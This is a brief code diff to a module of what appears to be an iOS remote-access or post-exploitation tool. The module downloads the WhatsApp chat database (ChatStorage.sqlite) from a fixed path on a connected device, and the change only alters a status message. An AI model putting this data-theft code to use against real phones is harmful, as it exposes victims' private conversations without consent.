@@ -11,7 +11,7 @@ class command:
 
     def run(self, session, cmd_data):
         file_name = "ChatStorage.sqlite"
-        h.info_general("Downloading {0}".format(file_name))
+        h.info_general("Downloading {0}... (this may take a while)".format(file_name))
         data = session.download_file('/private/var/mobile/Containers/Shared/AppGroup/D135448A-EDA9-417C-B6BE-53B0F614C3E2/'+file_name)
         if data:
             h.info_general("Saving {0}".format(file_name))
